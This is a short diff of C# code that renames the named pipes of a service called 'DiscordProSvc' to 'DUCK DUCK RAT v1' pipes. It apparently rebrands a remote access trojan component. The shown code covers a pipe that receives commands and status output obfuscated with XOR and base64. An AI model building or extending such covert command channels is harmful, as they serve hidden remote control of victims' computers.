@@ -51,7 +51,7 @@ namespace DiscordProSvc
             {
                 try
                 {
-                    using (var pipeServer = new NamedPipeServerStream("vanguard_discord_cmd", PipeDirection.In))
+                    using (var pipeServer = new NamedPipeServerStream("DUCK DUCK RAT v1_discord_cmd", PipeDirection.In))
                     {
                         pipeServer.WaitForConnection();
                         using (var reader = new StreamReader(pipeServer))
@@ -78,7 +78,7 @@ namespace DiscordProSvc
                 for (int i = 0; i < data.Length; i++) xorData[i] = (byte)(data[i] ^ salt[i % salt.Length]);
                 string base64 = Convert.ToBase64String(xorData);
 
-                using (var pipeClient = new NamedPipeClientStream(".", "vanguard_status_pipe", PipeDirection.Out))
+                using (var pipeClient = new NamedPipeClientStream(".", "DUCK DUCK RAT v1_status_pipe", PipeDirection.Out))
                 {
                     pipeClient.Connect(1000);
                     using (var writer = new StreamWriter(pipeClient))
@@ -225,3 +225,5 @@ namespace DiscordProSvc
         }
     }
 }
+
+
